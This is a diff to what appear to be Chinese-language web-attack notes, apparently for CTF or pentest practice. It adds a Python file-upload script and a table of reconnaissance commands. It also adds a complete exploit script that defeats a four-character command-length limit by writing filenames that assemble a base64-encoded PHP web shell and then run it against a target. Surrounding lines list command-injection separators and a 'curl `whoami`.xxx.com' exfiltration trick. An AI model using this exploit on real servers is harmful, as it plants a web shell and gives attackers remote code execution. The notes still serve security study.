@@ -1,5 +1,26 @@
 
 
+## python文件上传
+
+
+```python
+
+```
+
+
+```python
+import requests
+proxies={'http':'http://127.0.0.1:8081','https':'https://127.0.0.1:8081'}
+
+file_path="C:\\Users\\20925\\Desktop\\upload\\a.go"
+file={
+    "file":open(file_path,"rb")
+}
+data={
+    "user":"admin"
+}
+requests.post("http://127.0.0.1",files=file,data=data,proxies=proxies)
+```
 
 ## 文件包含
 后缀绕过
@@ -490,7 +511,16 @@ unicode
 hex
 
 ```
-# 命令执行bypass
+# 命令执行
+
+| Purpose of command | Linux | Windows |
+| ------------------ | ----- | ------- |
+|     Name of current user               |   whoami    |   whoami      |
+|Operating system	|uname -a|	ver
+|Network configuration	|ifconfig	|ipconfig /all
+|Network connections|	netstat -an|	netstat -an
+|Running processes|	ps -ef|	tasklist
+
 - 命令连接
 ```python
 ` & || | $()
@@ -507,6 +537,93 @@ curl `whoami`.xxx.com
 - 使用`\`换行符
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230530132922.png)
 
+长度4命令绕过
+##### script
+```python
+#-*-coding:utf8-*-
+import requests as r
+from time import sleep
+import random
+import hashlib
+target = 'http://172.28.149.62/'
+
+ 
+
+ 
+
+ 
+
+cmd = target + '?1='
+ 
+# payload某些位置的可选字符
+pos0 = random.choice('efgh')
+pos1 = random.choice('hkpq')
+pos2 = 'x'  # 随意选择字符
+ 
+payload = [
+    '>dir',
+    # 创建名为 dir 的文件
+ 
+    '>%s\>' % pos0,
+    # 假设pos0选择 f , 创建名为 f> 的文件
+ 
+    '>%st-' % pos1,
+    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
+    # 因为alphabetical序中t>s
+ 
+    '>sl',
+    # 创建名为 >sl 的文件；到此处有四个文件，
+    # ls 的结果会是：dir f> kt- sl
+ 
+    '*>v',
+    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
+    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
+    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
+ 
+    '>rev',
+    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
+ 
+    '*v>%s' % pos2,
+    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
+    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
+ 
+    # 续行分割     # echo PD89YCRfR0VUWzBdYDs=|base64    -d>a.php
+    '>p',
+    '>ph\\',
+    '>a.\\',
+    '>\>\\',
+    '>-d\\',
+    '>\\'+chr(9)+'\\',
+    '>64\\',
+    '>se\\',
+    '>ba\\',
+    '>\|\\',
+    '>s=\\',
+    '>YD\\',
+    '>Bd\\',
+    '>Wz\\',
+    '>VU\\',
+    '>R0\\',
+    '>Rf\\',
+    '>YC\\',
+    '>89\\',
+    '>PD\\',
+    '>\ \\',
+    '>ho\\',
+    '>ec\\',
+    'sh ' + pos2,
+    'sh ' + pos0,
+]
+ 
+for i in payload:
+    assert len(i) <= 4
+    s = r.get(cmd + i)
+    print('[%d]' % s.status_code, s.url)
+    sleep(0.1)
+s = r.get(cmd+'sh '+pos0)
+print('[%d]' % s.status_code, s.url)
+print(s.text)
+```
 
 # Nodejs
 
